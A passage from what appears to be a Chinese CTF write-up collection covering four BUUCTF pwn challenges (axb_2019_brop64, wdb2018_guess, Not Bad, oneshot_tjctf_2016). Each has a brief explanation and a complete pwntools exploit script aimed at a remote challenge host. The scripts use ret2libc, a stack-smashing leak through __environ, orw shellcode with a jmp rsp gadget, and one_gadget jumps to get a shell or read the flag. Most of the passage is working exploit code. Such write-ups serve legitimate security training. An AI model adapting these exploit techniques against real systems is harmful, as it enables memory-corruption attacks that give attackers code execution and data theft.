shell()
```

## 16.BUUCTF-axb_2019_brop64
栈溢出

<img width="603" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/28ad1a8c-fffe-4b18-9e98-ca90a03d0732">

常规ret2libc

### exp_axb_2019_brop64.py
```python
from pwn import *
# p = process("./axb_2019_brop64")
p = remote("node4.buuoj.cn",25597)
context.log_level = 'debug'
# context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")

# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("/mnt/hgfs/ubuntu/BUUCTF/source/ubuntu16/libc-2.23-64.so")

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

offset = 216

pop_rdi_ret = 0x0000000000400963
main = 0x0000000004007D6

puts_plt = 0x400640
puts_got = 0x000000000601018

# 1.leak libc
payload = b'A' * offset + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main)

ru("Please tell me:")
#raw_input("Ther")
sl(payload)

libc_puts = u64(ru('\x7f')[-6:].ljust(8, '\x00'))
success("libc_puts ==> {}".format(hex(libc_puts)))

libc_base = libc_puts - libc.symbols['puts']
success("libc_base ==> {}".format(hex(libc_base)))

libc_system = libc_base + libc.symbols['system']
success("libc_system ==> {}".format(hex(libc_system)))

libc_binsh = libc_base + libc.search('/bin/sh').next()
success("libc_binsh ==> {}".format(hex(libc_binsh)))

# 2.system("/bin/sh")
payload = b'A' * offset + p64(pop_rdi_ret) + p64(libc_binsh) + p64(libc_system) 

ru("Please tell me:")
raw_input("Ther")
sl(payload)

shell()
```

## 17.BUUCTF-wdb2018_guess
将flag读入到buf中 开启了canary 并且给了3次栈溢出的机会（通过fork进程）

<img width="518" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/fec5e5aa-9943-4780-9a1d-5210159968ae">

首先想到可以覆盖__libc_argv[0] 但不知道buf的地址在哪里 学习到可以通过泄漏libc

从而泄漏libc的__environ的值 这个值保存着一个栈地址（指向环境变量）

所以3次栈溢出可以构造为 

1.覆盖__libc_argv[0]为put_got 泄漏libc地址

2.覆盖__libc_argv[0]为libc__environ 泄漏栈地址

3.找到泄漏的栈地址与buf的偏移 覆盖__libc_argv[0]为buf地址 泄漏flag

### exp_GUESS.py
```python
from pwn import *
# p = process("./GUESS")
p = remote("node4.buuoj.cn",28526)
context.log_level = 'debug'
# context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("/mnt/hgfs/ubuntu/BUUCTF/source/ubuntu16/libc-2.23-64.so")

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

puts_got = 0x000000000602020

# 1.leak libc
payload = b'A' * 0x128 + p64(puts_got)
ru("Please type your guessing flag\n")
sl(payload)

ru("*** stack smashing detected ***: ")

libc_puts = u64(ru('\x7f').ljust(8, '\x00'))
success("libc_puts ==> {}".format(hex(libc_puts)))

libc_base = libc_puts - libc.symbols['puts']
success("libc_base ==> {}".format(hex(libc_base)))

libc_environ = libc_base + libc.symbols['__environ']
success("libc_environ ==> {}".format(hex(libc_environ)))

# 2.leak stack
payload = b'A' * 0x128 + p64(libc_environ)
ru("Please type your guessing flag\n")
sl(payload)

ru("*** stack smashing detected ***: ")

stack_addr = u64(ru('\x7f').ljust(8, '\x00'))
success("stack_addr ==> {}".format(hex(stack_addr)))

# 3.leak flag
flag_addr = stack_addr - 0x168

payload = b'A' * 0x128 + p64(flag_addr)
ru("Please type your guessing flag\n")
raw_input("Ther")
sl(payload)


shell()
```

## 18.BUUCTF-[极客大挑战 2019]Not Bad
orw 需要修改一下pwntools生成的shellcode 长度缩小一些

### exp_bad.py
```python
from pwn import *
# p = process("./bad")
p = remote("node4.buuoj.cn",27878)
context.log_level = 'debug'
context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

jmp_rsp = 0x0000000000400a01

sc = asm(shellcraft.open('flag'))
sc+= asm(shellcraft.read('rax', 'rsp', 0x30))
# sc+= asm(shellcraft.write(1, 'rsp', 0x30))
sc += asm('''
	push 1
    pop rdi
    /* call write() */
    push 1 /* 1 */
    pop rax
    syscall
	''')

payload = sc.ljust(40, '\x90') + p64(jmp_rsp) + asm("sub rsp, 48; call rsp")
ru("Easy shellcode, have fun!\n")

sl(payload)

shell()
```

## 19.BUUCTF-oneshot_tjctf_2016
任意地址泄漏 之后会将v4的值当作一个地址返回

<img width="387" alt="image" src="https://github.com/keepinggg/Weekly_Report/assets/62430054/15176deb-32dd-47a0-a543-7a998c61d1c7">

1.泄漏libc 2.将v4覆盖为one_gadget

### exp_oneshot_tjctf_2016.py
```python
from pwn import *
# p = process("./oneshot_tjctf_2016")
p = remote("node4.buuoj.cn",27026)
context.log_level = 'debug'
# context.arch = 'amd64'
# context(os="linux", arch="amd64",log_level = "debug")
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc = ELF("/mnt/hgfs/ubuntu/BUUCTF/source/ubuntu16/libc-2.23-64.so")


r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

puts_got = 6294232

# 1.leak libc
ru("Read location?\n")
sl(str(puts_got))

ru("Value: ")

libc_puts = int(rx(18), 16)
success("libc_puts ==> {}".format(hex(libc_puts)))

libc_base = libc_puts - libc.symbols['puts']
success("libc_base ==> {}".format(hex(libc_base)))

# ones = [0x45226, 0x4527a, 0xf03a4, 0xf1247]
ones = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

one_gadget = libc_base + ones[0]

# 2.one_gadget
ru("Jump location?\n")

sl(str(one_gadget))


shell()
```








